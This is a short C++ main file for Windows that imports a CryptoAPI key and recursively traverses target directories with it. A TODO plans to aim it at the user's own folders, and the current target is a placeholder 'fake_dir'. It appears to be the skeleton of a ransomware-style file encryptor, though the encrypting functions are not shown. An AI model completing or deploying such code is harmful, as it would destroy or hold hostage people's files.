#include <iostream>
#include <Windows.h>
#include <string>






//Function declarations

bool traverse(LPCWSTR targetDir, HCRYPTKEY clé,int nLevel = 0);
HCRYPTKEY keyimport();


//Main

int wmain() {

	//TODO ; use the getusername func and a bit of string manipulation for the dirs absolute path

	LPCWSTR targetDirs[] = { L"C:\\dev\\fake_dir" };
	

	HCRYPTKEY key = keyimport();

	for (LPCWSTR singledir : targetDirs) {
		
		
		traverse(singledir,key);
	}

	return 0;
}